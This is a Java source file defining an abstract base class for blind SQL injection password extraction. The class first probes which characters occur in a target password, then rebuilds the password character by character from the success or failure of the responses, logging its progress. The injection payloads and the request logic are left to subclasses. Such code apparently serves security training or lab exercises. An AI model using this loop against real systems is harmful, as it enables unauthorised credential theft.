package sqlInjection;

import java.io.OutputStream;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;

public abstract class AbstractSqlInjectionPasswordGuesser {

    private final int passwordLength;
    private final OutputStream progressOutputStream;

    protected AbstractSqlInjectionPasswordGuesser(int passwordLength,
                                                  OutputStream progressOutputStream) {
        this.passwordLength = passwordLength;
        this.progressOutputStream = progressOutputStream;
    }

    public String doInjection() throws Throwable {
        List<Character> charactersInPassword = getCharsInPassword();
        String password = "";
        for (int i = 0; i < passwordLength || password.length() < passwordLength; i++) {
            for (Character c : charactersInPassword) {
                String passwordBeginning = password.concat(c.toString());
                String body = getBodyForPasswordGuessing(passwordBeginning);
                if(isGuessSuccessful(body)){
                    password = passwordBeginning;
                    break;
                }
            }
            System.gc();
            if(progressOutputStream != null){
                progressOutputStream.write(String.format("%s%n", password).getBytes(StandardCharsets.UTF_8));
            }
        }
        return password;
    }

    private List<Character> getCharsInPassword() throws Throwable{
        List<Character> charsInPassword = new ArrayList<>();

        for (Character c : getAllowedCharacters()) {
            String body = getBodyForFilteringUsefulCharacters(c);
            if(isGuessSuccessful(body)){
                charsInPassword.add(c);
                if(progressOutputStream != null){
                    progressOutputStream.write(String.format("%s%n", c).getBytes(StandardCharsets.UTF_8));
                }
            }
        }
        return charsInPassword;
    }

    protected abstract String getBodyForFilteringUsefulCharacters(Character passwordCharacter);

    protected abstract String getBodyForPasswordGuessing(String passwordBeginning);

    protected abstract boolean isGuessSuccessful(String body) throws Throwable;

    protected abstract List<Character> getAllowedCharacters();

}
